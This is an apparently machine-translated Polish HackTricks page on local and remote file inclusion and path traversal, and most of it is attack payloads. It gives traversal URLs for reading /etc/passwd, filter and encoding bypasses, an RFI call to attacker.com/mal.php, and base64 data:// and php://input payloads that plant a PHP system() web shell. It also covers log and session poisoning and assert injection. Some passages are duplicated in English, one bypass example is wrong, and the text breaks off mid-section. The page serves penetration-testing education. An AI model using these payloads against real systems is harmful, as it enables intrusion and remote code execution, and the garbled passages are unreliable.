# Włączenie pliku / Traversal ścieżki

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Dołącz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikować się z doświadczonymi hakerami i łowcami nagród za błędy!

**Spostrzeżenia dotyczące hakerstwa**\
Zajmuj się treściami, które zagłębiają się w emocje i wyzwania hakerstwa

**Aktualności na żywo o hakerstwie**\
Bądź na bieżąco z szybkim tempem świata hakerstwa dzięki aktualnym wiadomościom i spostrzeżeniom

**Najnowsze ogłoszenia**\
Bądź na bieżąco z najnowszymi programami bug bounty i ważnymi aktualizacjami platformy

**Dołącz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij współpracować z najlepszymi hakerami już dziś!

## Włączenie pliku

**Zdalne włączenie pliku (RFI):** Plik jest ładowany z zdalnego serwera (najlepiej: możesz napisać kod, a serwer go wykonuje). W php jest to **wyłączone** domyślnie (**allow\_url\_include**).\
**Lokalne włączenie pliku (LFI):** Serwer ładuje lokalny plik.

Podatność występuje, gdy użytkownik w jakiś sposób może kontrolować plik, który zostanie załadowany przez serwer.

Podatne **funkcje PHP**: require, require\_once, include, include\_once

Ciekawe narzędzie do wykorzystania tej podatności: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Ślepe - Interesujące - Pliki LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Połączenie kilku list LFI dla systemów \*nix i dodanie kolejnych ścieżek stworzyło tę listę:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

Spróbuj również zmienić `/` na `\`\
Spróbuj również dodać `../../../../../`

Listę, która wykorzystuje kilka technik do znalezienia pliku /etc/password (w celu sprawdzenia, czy istnieje podatność), można znaleźć [tutaj](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Połączenie różnych list słów:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

Spróbuj również zmienić `/` na `\`\
Spróbuj również usunąć `C:/` i dodać `../../../../../`

Listę, która wykorzystuje kilka technik do znalezienia pliku /boot.ini (w celu sprawdzenia, czy istnieje podatność), można znaleźć [tutaj](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Sprawdź listę LFI dla systemu Linux.

## Podstawowe LFI i bypassy

Wszystkie przykłady dotyczą lokalnego włączenia pliku (Local File Inclusion), ale mogą być również stosowane do zdalnego włączenia pliku (Remote File Inclusion) (strona=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### sekwencje przechodzenia usunięte nierekurencyjnie

When performing file inclusion attacks, it is common to encounter input validation mechanisms that strip traversal sequences (such as "../" or "..\") from user-supplied input. These mechanisms are implemented to prevent directory traversal attacks. However, they are often implemented in a non-recursive manner, which means that they only remove one occurrence of the traversal sequence at a time.

Podczas wykonywania ataków na włączanie plików często spotyka się mechanizmy walidacji danych wejściowych, które usuwają sekwencje przechodzenia (takie jak "../" lub "..\") z dostarczonych przez użytkownika danych. Mechanizmy te są stosowane w celu zapobiegania atakom polegającym na przechodzeniu po katalogach. Jednak często są one implementowane w sposób nierekurencyjny, co oznacza, że usuwają tylko jedno wystąpienie sekwencji przechodzenia na raz.

This behavior can be exploited by using multiple traversal sequences in a single request. By repeating the traversal sequence multiple times, it is possible to bypass the input validation mechanism and access files located in higher-level directories.

Takie zachowanie można wykorzystać, używając wielu sekwencji przechodzenia w jednym żądaniu. Poprzez wielokrotne powtarzanie sekwencji przechodzenia, możliwe jest obejście mechanizmu walidacji danych wejściowych i uzyskanie dostępu do plików znajdujących się w wyższych katalogach.

For example, if the input validation mechanism removes only one occurrence of "../" at a time, the following input could be used to bypass it:

Na przykład, jeśli mechanizm walidacji danych wejściowych usuwa tylko jedno wystąpienie "../" na raz, można użyć następującego wejścia, aby go obejść:

```
../../../etc/passwd
```

In this case, the input validation mechanism would remove the first occurrence of "../", resulting in the following path:

W tym przypadku mechanizm walidacji danych wejściowych usunąłby pierwsze wystąpienie "../", co spowodowałoby następującą ścieżkę:

```
../../etc/passwd
```

However, the second occurrence of "../" would not be removed, allowing the attacker to access the `/etc/passwd` file.

Jednak drugie wystąpienie "../" nie zostanie usunięte, co umożliwia atakującemu dostęp do pliku `/etc/passwd`.
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypassuj dodawanie dodatkowych znaków na końcu podanego ciągu (bypass: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
To jest **rozwiązane od wersji PHP 5.4**

### **Kodowanie**

Możesz użyć niestandardowych kodowań, takich jak podwójne kodowanie URL (i inne):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Z istniejącego folderu

Być może back-end sprawdza ścieżkę folderu:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Eksplorowanie katalogów systemu plików na serwerze

System plików serwera można eksplorować rekurencyjnie, aby zidentyfikować katalogi, a nie tylko pliki, za pomocą określonych technik. Proces ten polega na określeniu głębokości katalogu i sprawdzaniu istnienia określonych folderów. Poniżej przedstawiono szczegółową metodę osiągnięcia tego:

1. **Określanie głębokości katalogu:**
Określ głębokość bieżącego katalogu, pobierając pomyślnie plik `/etc/passwd` (dotyczy to serwera opartego na systemie Linux). Przykładowy adres URL może być zbudowany w następujący sposób, wskazując głębokość trzy:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Sondowanie folderów:**
Dodaj nazwę podejrzanego folderu (np. `private`) do adresu URL, a następnie przejdź do `/etc/passwd`. Dodatkowy poziom katalogu wymaga zwiększenia głębokości o jeden:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretuj wyniki:**
Odpowiedź serwera wskazuje, czy folder istnieje:
- **Błąd / Brak wyniku:** Folder `private` prawdopodobnie nie istnieje pod wskazaną lokalizacją.
- **Zawartość `/etc/passwd`:** Potwierdza obecność folderu `private`.

4. **Rekurencyjne badanie:**
Odkryte foldery można dalej badać pod kątem podfolderów lub plików, korzystając z tej samej techniki lub tradycyjnych metod Local File Inclusion (LFI).

Aby badać foldery w różnych lokalizacjach w systemie plików, dostosuj ładunek odpowiednio. Na przykład, aby sprawdzić, czy `/var/www/` zawiera folder `private` (przy założeniu, że bieżący folder znajduje się na głębokości 3), użyj:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Technika skracania ścieżki**

Skracanie ścieżki to metoda manipulacji ścieżkami plików w aplikacjach internetowych. Często jest używana do uzyskiwania dostępu do ograniczonych plików poprzez obejście pewnych środków bezpieczeństwa, które dodają dodatkowe znaki na końcu ścieżek plików. Celem jest stworzenie ścieżki pliku, która po zmodyfikowaniu przez środek bezpieczeństwa wciąż wskazuje na żądany plik.

W PHP różne reprezentacje ścieżki pliku mogą być uważane za równoważne ze względu na charakter systemu plików. Na przykład:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` i `/etc/passwd/` są traktowane jako ta sama ścieżka.
- Gdy ostatnie 6 znaków to `passwd`, dodanie `/` na końcu (tworząc `passwd/`) nie zmienia docelowego pliku.
- Podobnie, jeśli do ścieżki pliku (np. `shellcode.php`) dodamy `.php`, dodanie `/.` na końcu nie zmieni dostępu do pliku.

Przedstawione przykłady demonstrują, jak wykorzystać skracanie ścieżki do uzyskania dostępu do `/etc/passwd`, powszechnego celu ze względu na swoją wrażliwą zawartość (informacje o kontach użytkowników):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
W tych scenariuszach liczba potrzebnych przemieszczeń może wynosić około 2027, ale ta liczba może się różnić w zależności od konfiguracji serwera.

- **Używanie segmentów kropkowych i dodatkowych znaków**:
Sekwencje przemieszczeń (`../`) połączone z dodatkowymi segmentami kropkowymi i znakami mogą być używane do nawigacji po systemie plików, efektywnie ignorując dołączone ciągi przez serwer.

- **Określanie wymaganej liczby przemieszczeń**:
Przez próbę i błąd można znaleźć dokładną liczbę sekwencji `../` potrzebną do nawigacji do katalogu głównego, a następnie do `/etc/passwd`, zapewniając, że wszelkie dołączone ciągi (np. `.php`) są zneutralizowane, ale żądana ścieżka (`/etc/passwd`) pozostaje nietknięta.

- **Rozpoczęcie od fałszywego katalogu**:
To powszechna praktyka rozpoczynania ścieżki od nieistniejącego katalogu (np. `a/`). Ta technika jest stosowana jako środek ostrożności lub do spełnienia wymagań logiki analizy ścieżki serwera.

Podczas korzystania z technik skracania ścieżki ważne jest zrozumienie zachowania analizy ścieżki serwera i struktury systemu plików. Każdy scenariusz może wymagać innego podejścia, a testowanie jest często konieczne, aby znaleźć najbardziej skuteczną metodę.

**Ta podatność została naprawiona w PHP 5.3.**

### **Sztuczki obejścia filtrów**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Zdalne uwzględnianie plików

W PHP jest to domyślnie wyłączone, ponieważ **`allow_url_include`** jest ustawione na **Off**. Musi być ustawione na **On**, aby to działało, a w takim przypadku można uwzględnić plik PHP z serwera i uzyskać zdalne wykonanie kodu (RCE):
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Jeśli z jakiegoś powodu **`allow_url_include`** jest ustawione na **On**, ale PHP **filtrowanie** dostępu do zewnętrznych stron internetowych, [zgodnie z tym postem](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), można użyć na przykład protokołu danych z base64 do dekodowania kodu PHP w formacie b64 i uzyskania zdalnego wykonania kodu (RCE):

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
W poprzednim kodzie, końcówka `+.txt` została dodana, ponieważ atakujący potrzebował ciągu znaków kończącego się na `.txt`, więc ciąg kończy się tym i po zdekodowaniu b64 ta część zwróci tylko śmieci, a prawdziwy kod PHP zostanie dołączony (i w związku z tym, wykonany).
{% endhint %}

Inny przykład **bez użycia protokołu `php://`** to:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python Root element

W języku Python w kodzie takim jak ten:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Jeśli użytkownik poda **bezwzględną ścieżkę** do **`nazwa_pliku`**, **poprzednia ścieżka jest po prostu usunięta**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
To jest zamierzone zachowanie zgodnie z [dokumentacją](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Jeśli składnik jest ścieżką bezwzględną, wszystkie poprzednie składniki są odrzucane, a łączenie kontynuuje od składnika ścieżki bezwzględnej.

## Java Listowanie Katalogów

Wygląda na to, że jeśli masz Path Traversal w Javie i **poprosisz o katalog** zamiast pliku, zostanie zwrócone **listowanie katalogu**. W innych językach tak się nie dzieje (o ile mi wiadomo).

## Top 25 parametrów

Oto lista 25 najważniejszych parametrów, które mogą być podatne na lokalne włączenie plików (LFI) (z [linku](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI za pomocą wrapperów i protokołów PHP

### php://filter

Filtry PHP pozwalają na podstawowe operacje **modyfikacji danych** przed ich odczytem lub zapisem. Istnieje 5 kategorii filtrów:

* [Filtry dla ciągów znaków](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Usuwa tagi z danych (wszystko pomiędzy znakami "<" i ">")
* Należy zauważyć, że ten filtr zniknął z nowszych wersji PHP
* [Filtry konwersji](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : Przekształca dane na inny kodowanie (`convert.iconv.<input_enc>.<output_enc>`). Aby uzyskać **listę wszystkich obsługiwanych kodowań**, uruchom w konsoli: `iconv -l`

{% hint style="warning" %}
Wykorzystując filtr konwersji `convert.iconv.*`, można **generować dowolny tekst**, co może być przydatne do pisania dowolnego tekstu lub tworzenia funkcji, która przetwarza dowolny tekst. Więcej informacji znajdziesz w [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtry kompresji](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Kompresuje zawartość (przydatne przy eksfiltracji dużej ilości informacji)
* `zlib.inflate`: Dekompresuje dane
* [Filtry szyfrowania](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : Przestarzałe
* `mdecrypt.*` : Przestarzałe
* Inne filtry
* Uruchomienie w PHP `var_dump(stream_get_filters());` pozwala znaleźć kilka **niespodziewanych filtrów**:
* `consumed`
* `dechunk`: Odwraca kodowanie HTTP chunked
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
Część "php://filter" jest nieczuła na wielkość liter
{% endhint %}

### php://fd

Ten wrapper umożliwia dostęp do deskryptorów plików, które proces ma otwarte. Potencjalnie przydatne do wydostawania zawartości otwartych plików:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Możesz również użyć **php://stdin, php://stdout i php://stderr** do uzyskania dostępu do **deskryptorów plików 0, 1 i 2** odpowiednio (nie jestem pewien, jak to może być przydatne w ataku).

### zip:// i rar://

Prześlij plik Zip lub Rar z PHPShell wewnątrz i uzyskaj do niego dostęp.\
Aby móc nadużywać protokołu rar, **musi być on specjalnie aktywowany**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

`data://` is a pseudo-protocol that allows you to embed data directly into a URL. This can be useful in scenarios where you want to include small amounts of data directly in a web page or application without making an additional request to the server.

To use `data://`, you simply need to specify the MIME type of the data, followed by a comma, and then the actual data itself. For example, if you wanted to include the text "Hello, world!" in a URL, you would use the following format:

```
data:text/plain,Hello%2C%20world%21
```

In this example, `text/plain` is the MIME type for plain text, and `Hello%2C%20world%21` is the URL-encoded version of "Hello, world!".

Keep in mind that the data you include using `data://` is embedded directly in the URL, so it can be easily viewed by anyone who has access to the URL. Therefore, it is important to be cautious when using `data://` and avoid including sensitive information.

Some potential use cases for `data://` include embedding small images, CSS styles, or even JavaScript code directly in a URL. However, it is important to note that not all browsers and applications support `data://`, so it may not be universally compatible.

Overall, `data://` can be a useful tool for including small amounts of data directly in a URL, but it should be used with caution and awareness of its limitations.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Należy zauważyć, że ten protokół jest ograniczony przez konfiguracje php **`allow_url_open`** i **`allow_url_include`**

### expect://

Oczekiwanie musi być aktywowane. Możesz wykonać kod używając tego:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Określ swoje dane wejściowe w parametrach POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Plik `.phar` może być wykorzystany do wykonania kodu PHP, gdy aplikacja internetowa korzysta z funkcji takich jak `include` do ładowania plików. Poniższy fragment kodu PHP przedstawia tworzenie pliku `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Aby skompilować plik `.phar`, należy wykonać następujące polecenie:
```bash
php --define phar.readonly=0 create_path.php
```
Po wykonaniu zostanie utworzony plik o nazwie `test.phar`, który potencjalnie może być wykorzystany do wykorzystania podatności na lokalne włączenie plików (LFI).

W przypadkach, gdy LFI wykonuje tylko odczyt pliku bez wykonywania kodu PHP wewnątrz, za pomocą funkcji takich jak `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` lub `filesize()`, można spróbować wykorzystać podatność na deserializację. Ta podatność jest związana z odczytem plików za pomocą protokołu `phar`.

Aby dokładnie zrozumieć wykorzystywanie podatności na deserializację w kontekście plików `.phar`, należy odwołać się do dokumentu podlinkowanego poniżej:

[Przewodnik po wykorzystywaniu podatności na deserializację w plikach .phar](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### Więcej protokołów

Sprawdź więcej możliwych [**protokołów do uwzględnienia tutaj**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory i php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Zapis w pamięci lub w pliku tymczasowym (nie jestem pewien, jak to może być przydatne w ataku na włączenie pliku)
* [file://](https://www.php.net/manual/en/wrappers.file.php) — Dostęp do lokalnego systemu plików
* [http://](https://www.php.net/manual/en/wrappers.http.php) — Dostęp do adresów URL HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Dostęp do adresów URL FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Strumienie kompresji
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Znajdowanie ścieżek pasujących do wzorca (nie zwraca nic drukowalnego, więc tutaj nie jest zbyt przydatne)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Strumienie audio (nie przydatne do odczytu dowolnych plików)

## LFI za pomocą funkcji 'assert' w PHP

Ryzyko lokalnego włączenia plików (LFI) w PHP jest szczególnie wysokie, gdy korzysta się z funkcji 'assert', która może wykonywać kod wewnątrz ciągów znaków. Jest to szczególnie problematyczne, jeśli wejście zawiera znaki nawigacji po katalogach, takie jak "..", które są sprawdzane, ale nie są odpowiednio oczyszczane.

Na przykład, kod PHP może być zaprojektowany w taki sposób, aby zapobiegać nawigacji po katalogach, jak w poniższym przykładzie:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Podczas gdy to ma na celu zatrzymanie przechodzenia, nieumyślnie tworzy wektor dla wstrzykiwania kodu. Aby wykorzystać to do odczytu zawartości pliku, atakujący mógłby użyć:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Podobnie, do wykonania dowolnych poleceń systemowych można użyć:
```plaintext
' and die(system("id")) or '
```
Ważne jest **URL-kodowanie tych payloadów**.


<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Dołącz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikować się z doświadczonymi hakerami i łowcami błędów!

**Wgląd w hakerstwo**\
Zajmuj się treściami, które zagłębiają się w emocje i wyzwania hakerstwa

**Aktualności o hakerstwie na żywo**\
Bądź na bieżąco z szybkim tempem świata hakerstwa dzięki aktualnym wiadomościom i wglądowi

**Najnowsze ogłoszenia**\
Bądź na bieżąco z najnowszymi programami bug bounty i ważnymi aktualizacjami platformy

**Dołącz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij współpracować z najlepszymi hakerami już dziś!

## PHP Blind Path Traversal

{% hint style="warning" %}
Ta technika jest istotna w przypadkach, gdy **kontrolujesz** **ścieżkę pliku** funkcji **PHP**, która będzie **odczytywać plik**, ale nie zobaczysz zawartości pliku (jak w prostym wywołaniu **`file()`**), ale zawartość nie jest wyświetlana.
{% endhint %}

W [**tym niesamowitym poście**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) wyjaśniono, jak ślepa nawigacja ścieżką może być wykorzystana za pomocą filtru PHP do **wycieku zawartości pliku za pomocą orakulum błędów**.

Podsumowując, technika ta polega na użyciu kodowania **"UCS-4LE"**, aby zawartość pliku była tak **duża**, że funkcja PHP otwierająca plik spowoduje **błąd**.

Następnie, aby ujawnić pierwszy znak, używany jest filtr **`dechunk`** wraz z innymi, takimi jak **base64** lub **rot13**, a na końcu używane są filtry **convert.iconv.UCS-4.UCS-4LE** i **convert.iconv.UTF16.UTF-16BE**, aby **umieścić inne znaki na początku i ujawnić je**.

**Funkcje, które mogą być podatne**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (tylko docelowe tylko do odczytu z tym)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Aby uzyskać szczegóły techniczne, sprawdź wspomniany post!

## LFI2RCE

### Remote File Inclusion

Wyjaśnione wcześniej, [**kliknij tutaj**](./#remote-file-inclusion).

### Za pomocą pliku dziennika Apache/Nginx

Jeśli serwer Apache lub Nginx jest **podatny na LFI** wewnątrz funkcji include, możesz spróbować uzyskać dostęp do **`/var/log/apache2/access.log` lub `/var/log/nginx/access.log`**, ustaw wewnątrz **user agent** lub wewnątrz parametru **GET** powłokę PHP, na przykład **`<?php system($_GET['c']); ?>`**, a następnie dołącz ten plik

{% hint style="warning" %}
Zwróć uwagę, że **jeśli używasz podwójnych cudzysłowów** dla powłoki zamiast **pojedynczych cudzysłowów**, podwójne cudzysłowy zostaną zmodyfikowane na ciąg "_**quote;**_", **PHP wyrzuci błąd** i **nic więcej nie zostanie wykonane**.

Upewnij się również, że **poprawnie zapisujesz payload**, w przeciwnym razie PHP będzie generować błąd za każdym razem, gdy spróbuje załadować plik dziennika, i nie będziesz mieć drugiej szansy.
{% endhint %}

Można to również zrobić w innych dziennikach, ale **bądź ostrożny**, kod wewnątrz dzienników może być kodowany URL i może to zniszczyć powłokę. Nagłówek **authorisation "basic"** zawiera "user:password" w Base64 i jest dekodowany wewnątrz dzienników. Powłokę PHP można wstawić wewnątrz tego nagłówka.\
Inne możliwe ścieżki dziennika:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Przez Email

**Wyślij wiadomość** na wewnętrzne konto (user@localhost) zawierającą swój kod PHP, na przykład `<?php echo system($_REQUEST["cmd"]); ?>`, a następnie spróbuj dołączyć do wiadomości użytkownika za pomocą ścieżki **`/var/mail/<USERNAME>`** lub **`/var/spool/mail/<USERNAME>`**

### Przez /proc/\*/fd/\*

1. Prześlij wiele powłok (na przykład: 100)
2. Dołącz [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), gdzie $PID to identyfikator procesu (może być wybrute-forced) i $FD to deskryptor pliku (również może być wybrute-forced)

### Przez /proc/self/environ

Podobnie jak w przypadku pliku dziennika, wyślij payload w nagłówku User-Agent, zostanie on odzwierciedlony w pliku /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Przez przesłanie pliku

Jeśli możesz przesłać plik, po prostu wstrzyknij do niego ładunek powłoki (np. `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Aby zachować czytelność pliku, najlepiej jest wstrzyknąć do metadanych obrazów/doc/pdf.

### Za pomocą przesyłania pliku ZIP

Prześlij plik ZIP zawierający skompresowany PHP shell i uzyskaj dostęp:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Za pomocą sesji PHP

Sprawdź, czy strona internetowa używa sesji PHP (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
W PHP te sesje są przechowywane w plikach _/var/lib/php5/sess\\_\[PHPSESSID]\_.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Ustaw ciasteczko na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
# Włączanie pliku sesji PHP za pomocą LFI

## Opis

Włączanie pliku sesji PHP za pomocą Local File Inclusion (LFI) jest techniką wykorzystywaną w celu uzyskania dostępu do zawartości sesji użytkownika. LFI pozwala na wczytanie plików z lokalnego systemu plików, co może prowadzić do odczytu poufnych informacji, takich jak dane uwierzytelniające, tokeny sesji i inne dane sesji.

## Wykorzystanie

Aby wykorzystać LFI do włączenia pliku sesji PHP, należy znaleźć podatny punkt końcowy, który umożliwia wczytanie plików z lokalnego systemu plików. Może to być spowodowane nieodpowiednią walidacją danych wejściowych lub nieprawidłowym wykorzystaniem funkcji do wczytywania plików.

